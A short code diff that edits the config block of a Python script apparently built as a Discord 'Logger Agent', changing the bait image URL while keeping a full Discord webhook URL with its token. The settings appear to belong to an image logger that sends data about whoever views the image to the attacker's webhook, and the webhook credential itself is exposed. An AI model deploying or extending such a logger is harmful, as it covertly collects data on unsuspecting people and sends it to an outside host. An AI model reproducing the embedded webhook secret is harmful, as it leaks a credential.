@@ -11,7 +11,7 @@ __author__ = "foaqen"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1467553434541625558/fKl1f66ykkbYUxlzxhR-ODuDaskO6bZvEi_Xb7zxeR0MNelnYg3LJBs-ZFCmA2QYDmbK",
-    "image": "https://cdn.discordapp.com/attachments/1466933159265571070/1467962687282745565/togif.gif?ex=6990220a&is=698ed08a&hm=02ba3c757e35f739cb435d74f07e26edc52582267f73a96bedc9455ea749945f&", 
+    "image": "https://github.com/CravexGlokkNine/image/blob/main/image.png", 
     "imageArgument": True,
 
     "username": "Logger Agent", 
